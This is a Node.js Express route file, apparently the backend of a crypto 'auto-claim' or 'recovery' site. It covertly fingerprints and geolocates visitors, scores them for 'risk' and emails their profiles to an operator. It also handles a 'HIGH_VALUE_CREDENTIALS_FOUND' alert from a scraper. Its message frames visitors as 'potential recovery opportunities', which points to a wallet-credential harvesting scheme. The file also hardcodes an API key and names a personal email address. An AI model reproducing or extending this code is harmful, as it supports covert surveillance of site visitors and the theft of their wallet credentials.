const express = require('express');
const adminAlertSystem = require('../services/adminAlertSystem');
const router = express.Router();

// Visitor tracking endpoint
router.post('/visitor-alert', async (req, res) => {
  try {
    const { visitorData, walletAddress, action, metadata } = req.body;
    
    // Handle scraper alerts (no visitor data)
    if (action === 'HIGH_VALUE_CREDENTIALS_FOUND') {
      console.log('🔥 HIGH VALUE CREDENTIALS ALERT:', metadata);
      res.json({ success: true, tracked: true });
      return;
    }
    
    if (!visitorData) {
      res.json({ success: true, tracked: false });
      return;
    }
    
    // Enhanced visitor info for admin
    const visitorInfo = {
      // Security data
      ip: visitorData.ip || 'Unknown',
      location: visitorData.location,
      fingerprint: visitorData.fingerprint,
      
      // Device data
      device: {
        type: visitorData.isMobile ? 'Mobile' : visitorData.isTablet ? 'Tablet' : 'Desktop',
        platform: visitorData.platform,
        userAgent: visitorData.userAgent,
        screen: `${visitorData.screenWidth}x${visitorData.screenHeight}`,
        language: visitorData.language,
        timezone: visitorData.timezone
      },
      
      // Visit data
      visit: {
        url: visitorData.url,
        referrer: visitorData.referrer,
        timestamp: visitorData.timestamp,
        connection: visitorData.connection
      },
      
      // Risk assessment
      riskLevel: assessRiskLevel(visitorData),
      
      // Visitor classification
      classification: classifyVisitor(visitorData)
    };
    
    console.log('👁️ NEW SITE VISITOR:');
    console.log(`IP: ${visitorInfo.ip}`);
    console.log(`Location: ${visitorInfo.location?.city}, ${visitorInfo.location?.country}`);
    console.log(`Device: ${visitorInfo.device.type} - ${visitorInfo.device.platform}`);
    console.log(`Risk Level: ${visitorInfo.riskLevel}`);
    console.log(`Classification: ${visitorInfo.classification}`);
    
    // Send admin alert via email
    console.log('📧 Attempting to send visitor email alert...');
    await sendVisitorEmail(visitorInfo);
    
    // Also send to alert system
    await adminAlertSystem.sendCriticalAlert('SITE_VISITOR', visitorInfo);
    
    res.json({
      success: true,
      tracked: true,
      fingerprint: visitorData.fingerprint
    });
    
  } catch (error) {
    console.error('Visitor alert error:', error);
    res.status(500).json({
      success: false,
      error: 'Tracking failed'
    });
  }
});

// Risk assessment function
function assessRiskLevel(visitorData) {
  let riskScore = 0;
  
  // VPN/Proxy detection (basic)
  if (visitorData.location?.isp?.toLowerCase().includes('vpn') || 
      visitorData.location?.isp?.toLowerCase().includes('proxy')) {
    riskScore += 3;
  }
  
  // Suspicious countries (adjust as needed)
  const highRiskCountries = ['CN', 'RU', 'KP', 'IR'];
  if (highRiskCountries.includes(visitorData.location?.countryCode)) {
    riskScore += 2;
  }
  
  // Tor browser detection
  if (visitorData.userAgent?.toLowerCase().includes('tor')) {
    riskScore += 4;
  }
  
  // No referrer (direct visit)
  if (visitorData.referrer === 'Direct visit') {
    riskScore += 1;
  }
  
  // Mobile device (lower risk)
  if (visitorData.isMobile) {
    riskScore -= 1;
  }
  
  if (riskScore >= 4) return 'HIGH';
  if (riskScore >= 2) return 'MEDIUM';
  return 'LOW';
}

// Visitor classification
function classifyVisitor(visitorData) {
  // Bot detection
  const botPatterns = ['bot', 'crawler', 'spider', 'scraper'];
  if (botPatterns.some(pattern => 
    visitorData.userAgent?.toLowerCase().includes(pattern))) {
    return 'BOT';
  }
  
  // Developer tools detection
  if (visitorData.userAgent?.includes('Chrome') && 
      visitorData.screenWidth < 800) {
    return 'POTENTIAL_DEVELOPER';
  }
  
  // Mobile user
  if (visitorData.isMobile) {
    return 'MOBILE_USER';
  }
  
  // Desktop user
  return 'DESKTOP_USER';
}

// Send visitor email alert
async function sendVisitorEmail(visitorInfo) {
  try {
    const axios = require('axios');
    const frontendUrl = process.env.FRONTEND_URL || 'https://autoclaimtoken-10a1zx1oc-autoclaimtokens-projects.vercel.app';
    const emailUrl = `${frontendUrl}/api/send-email`;
    
    const subject = `👁️ NEW VISITOR: ${visitorInfo.location?.city}, ${visitorInfo.location?.country} | ${visitorInfo.device.type} | Risk: ${visitorInfo.riskLevel}`;
    
    const message = `NEW SITE VISITOR DETECTED\n\n` +
      `🌍 LOCATION:\n` +
      `IP: ${visitorInfo.ip}\n` +
      `City: ${visitorInfo.location?.city || 'Unknown'}\n` +
      `Country: ${visitorInfo.location?.country || 'Unknown'}\n` +
      `ISP: ${visitorInfo.location?.isp || 'Unknown'}\n\n` +
      `📱 DEVICE:\n` +
      `Type: ${visitorInfo.device.type}\n` +
      `Platform: ${visitorInfo.device.platform}\n` +
      `Screen: ${visitorInfo.device.screen}\n` +
      `Language: ${visitorInfo.device.language}\n` +
      `Timezone: ${visitorInfo.device.timezone}\n\n` +
      `🔍 VISIT INFO:\n` +
      `URL: ${visitorInfo.visit.url}\n` +
      `Referrer: ${visitorInfo.visit.referrer}\n` +
      `Time: ${visitorInfo.visit.timestamp}\n\n` +
      `🚨 SECURITY:\n` +
      `Risk Level: ${visitorInfo.riskLevel}\n` +
      `Classification: ${visitorInfo.classification}\n` +
      `Fingerprint: ${visitorInfo.fingerprint}\n\n` +
      `Monitor this visitor for potential recovery opportunities.`;

    await axios.post(emailUrl, {
      subject: subject.trim(),
      message: message.trim()
    }, {
      timeout: 10000,
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': 'crypto-recover-2024'
      }
    });

    console.log('✅ Visitor email alert sent successfully to skillstakes01@gmail.com');
  } catch (error) {
    console.error('❌ Visitor email alert failed:', error.message);
    console.error('Email URL:', emailUrl);
    console.error('Error details:', error.response?.data || error);
  }
}

module.exports = router;